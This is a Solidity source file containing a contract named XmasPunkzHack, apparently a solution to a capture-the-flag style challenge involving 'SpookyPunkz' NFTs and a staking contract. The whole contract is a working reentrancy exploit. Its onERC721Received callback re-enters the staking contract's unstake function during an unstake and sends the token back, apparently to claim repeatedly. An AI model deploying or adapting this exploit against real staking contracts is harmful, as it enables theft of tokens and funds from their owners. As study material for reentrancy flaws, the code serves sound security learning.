pragma solidity ^0.8.18;

interface IERC721Receiver {
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4);
}

interface IERC721 {
    function balanceOf(address owner) external view returns (uint256 balance);

    function ownerOf(uint256 tokenId) external view returns (address owner);

    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId
    ) external;

    function transferFrom(address from, address to, uint256 tokenId) external;

    function approve(address to, uint256 tokenId) external;

    function getApproved(
        uint256 tokenId
    ) external view returns (address operator);

    function setApprovalForAll(address operator, bool _approved) external;

    function isApprovedForAll(
        address owner,
        address operator
    ) external view returns (bool);

    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId,
        bytes calldata data
    ) external;
}

interface IStaking {
    function stake(uint256 _tokenId) external payable;

    function unstake(uint256 _tokenId) external payable;
}

contract XmasPunkzHack {
    bool hacking = false;
    address spookyPunkz;
    address xmasPunkz;
    address staking;

    constructor(
        address _spookyPunkz,
        address _xmasPunkz,
        address _staking
    ) payable {
        spookyPunkz = _spookyPunkz;
        xmasPunkz = _xmasPunkz;
        staking = _staking;
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external returns (bytes4) {
        if (hacking) {
            hacking = false;
            IStaking(staking).unstake{value: 2690000000000000000}(0);
            IERC721(spookyPunkz).transferFrom(address(this), staking, 0);
        }

        return IERC721Receiver.onERC721Received.selector;
    }

    function stake() external {
        IERC721(spookyPunkz).approve(staking, 0);
        IStaking(staking).stake{value: 2690000000000000000}(0);
    }

    function unstake() external {
        hacking = true;
        IStaking(staking).unstake{value: 2690000000000000000}(0);
    }
}

